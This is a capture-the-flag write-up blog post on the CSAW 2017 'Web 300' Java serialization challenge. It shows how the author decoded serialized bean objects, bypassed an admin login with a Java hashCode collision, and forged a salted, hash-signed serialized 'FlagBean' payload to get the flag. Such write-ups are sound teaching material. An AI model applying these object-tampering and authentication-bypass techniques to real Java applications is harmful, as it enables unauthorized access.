---
layout: post
title:  "Java Serialization - CSAW Web 300"
image: ''
date:   2017-09-18 00:06:31
tags:
- Java Serialization, CSAW-Qualifiers, CSAW-2017
description: 'Web 300 - Java Serialization'
categories:
- Web, Java Serialization
---

So after a break from last year writing blogs, I thought of writing blog for this particular challenge for the reason that the time it took to get solved and also the method involved to solve this particular challenge.

The challenge description was `Not My Cup of Coffee, I heard you liked food based problems, so here's a liquid one.`
<a href="http://web.chal.csaw.io:8616"> Challenge Link</a>

Clicking on the link directs us to home where they have some beans already present in a table in which scrolling down shows `Flag` which we are interested in.
<figure class="foto-legenda">
	<img src="{{ "/assets/img/ctfwriteup/Welcome_screen.png"}}" alt="">
</figure>

Below that there was a link to the `admin` panel which led to a password protected page. When I tried entering random values, it showed incorrect. For a moment, I thought it would be injection but did not seem to work out.

Later, going back to the main page had an option of `Start breeding` wherein there is a coloumn where there were two fields to enter our input and another two boxes containing parent1 and parent2. Randomly tried giving in some input and gave the default parent which was `Covfefe` with the name as `bi0s`.
Redirecting to the home page and scrolling down showed us that our value got input with a description as well of `Covfefe`. Since there was `Flag` below that, my essential aim was to see which parent's description was inherited and bingo, it was parent1. Also we were able to see that the parent list in the `Start Breeding` page had new options being added with the Name that we gave before.

<figure class="foto-legenda">
	<img src="{{ "/assets/img/ctfwriteup/flagbreed.png"}}" alt="">
</figure>

Later on going through the source code revealed that there was something next to the option, which was more of like a alphanumeric string seperated by a hash. Was able to get that the first was a base64 string and the second, some hex string. Decoding the base64 string of one of the options, here I took `Covfefe`, revealed a string.

<figure class="foto-legenda">
	<img src="{{ "/assets/img/ctfwriteup/base64_option.png"}}" alt="">
</figure>

{% highlight python %}
In [2]: base64.b64decode("rO0ABXNyABJjb2ZmZWUuQ292ZmVmZUJlYW4AAAAAAAAAAQIAAHhyAAtjb2ZmZWUuQmVhbgAAAAAAAAABAgAETAAHaW5oZXJpdHQADUxjb
   ...: 2ZmZWUvQmVhbjtMAARuYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAHcGFyZW50MXEAfgACTAAHcGFyZW50MnEAfgACeHBwdAAHQ292ZmVmZXBw")
Out[2]: '\xac\xed\x00\x05sr\x00\x12coffee.CovfefeBean\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x00xr\x00\x0bcoffee.Bean\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x04L\x00\x07inheritt\x00\rLcoffee/Bean;L\x00\x04namet\x00\x12Ljava/lang/String;L\x00\x07parent1q\x00~\x00\x02L\x00\x07parent2q\x00~\x00\x02xppt\x00\x07Covfefepp'
{% endhighlight %}

So after a bit of traversal through the web site, there was a request to `admin.jsp` and going to that (http://web.chal.csaw.io:8616/admin.jsp) dumped the password with a `$` sign in between.

{% highlight java %}
String result;
26:           // NOTE: Change $ to s when page is ready
27:           auth.loadPassword("Pas$ion");
28:           if (!guess.matches("[A-Za-z0-9]+")) {
29:             result = "Only alphanumeric characters allowed";
30:           } else {
31:             result = auth.lookup(guess.hashCode());
{% endhighlight %}

but since JavaCodes are deterministic, we can create one that matches this and that was `ParCipO`.

<figure class="foto-legenda">
	<img src="{{ "/assets/img/ctfwriteup/Password_screen.png"}}" alt="">
</figure>

Logging in to the admin page with this string

<figure class="foto-legenda">
	<img src="{{ "/assets/img/ctfwriteup/Key.png"}}" alt="">
</figure>

gave me a key which was `c@ram31m4cchi@o`. Also, we had a hash appended towards the end of the serialized beans. After a bit of digging, I found that the hash appended was just a salt and not anything else. Now basically I had to craft a payload which contains the keyword `Flag` in it, appended with the salt.

The next thing was crafting the `parent1` as `payload + "-" + sha256sumhex(payload + salt)` where `salt` was `c@ram31m4cchi@o`. Essentially, crafting the payload was a bit task so in the beginning, my team-mate <a href="http://www.i4info.in/"> Heeraj</a> and I had thought of replacing `Covfefe` with `Flag` and had sent request by modifying `parent1` but yielded no result. Then what we had thought was the string length of `Flag` with that of `Covfefe`. Yes, it is different and hence would alter the structure. So the very next moment, we took the base64 of `Raid`, updated with `Flag` and appended the hash that was to be appended which was `6715801eb21604db3f35709ff86ee6ac86e75bab042d2e4fced219c7a130763c`.

{% highlight python%}
In [3]: base64.b64decode("rO0ABXNyAA9jb2ZmZWUuUmFpZEJlYW4AAAAAAAAAAQIAAHhyAAtjb2ZmZWUuQmVhbgAAAAAAAAABAgAETAAHaW5oZXJpdHQADUxjb2ZmZ
   ...: WUvQmVhbjtMAARuYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAHcGFyZW50MXEAfgACTAAHcGFyZW50MnEAfgACeHBwdAAEUmFpZHBw")
Out[3]: '\xac\xed\x00\x05sr\x00\x0fcoffee.RaidBean\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x00xr\x00\x0bcoffee.Bean\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x04L\x00\x07inheritt\x00\rLcoffee/Bean;L\x00\x04namet\x00\x12Ljava/lang/String;L\x00\x07parent1q\x00~\x00\x02L\x00\x07parent2q\x00~\x00\x02xppt\x00\x04Raidpp'

In [4]: str = "\xac\xed\x00\x05sr\x00\x0fcoffee.FlagBean\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x00xr\x00\x0bcoffee.Bean\x00\x00\x
   ...: 00\x00\x00\x00\x00\x01\x02\x00\x04L\x00\x07inheritt\x00\rLcoffee/Bean;L\x00\x04namet\x00\x12Ljava/lang/String;L\x00\x07pare
   ...: nt1q\x00~\x00\x02L\x00\x07parent2q\x00~\x00\x02xppt\x00\x04Flagpp'"
{%endhighlight%}

So the final string that had to be sent to the server in `parent1` was
{%highlight python %}
 `rO0ABXNyAA9jb2ZmZWUuRmxhZ0JlYW4AAAAAAAAAAQIAAHhyAAtjb2ZmZWUuQmVhbgAAAAAAAAABAgAETAAHaW5oZXJpdHQADUxjb2ZmZWUvQmVhbjtMAARuYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAHcGFyZW50MXEAfgACTAAHcGFyZW50MnEAfgACeHBwdAAERmxhZ3Bw-6715801eb21604db3f35709ff86ee6ac86e75bab042d2e4fced219c7a130763c`.
{% endhighlight %}

Bingo, modifying the request of `parent1` with the parameter of `Name` filled gives us the flag

<figure class="foto-legenda">
	<img src="{{ "/assets/img/ctfwriteup/burpfinal.png"}}" alt="">
</figure>

`flag{yd1dw3wr1t3th15j@v....`
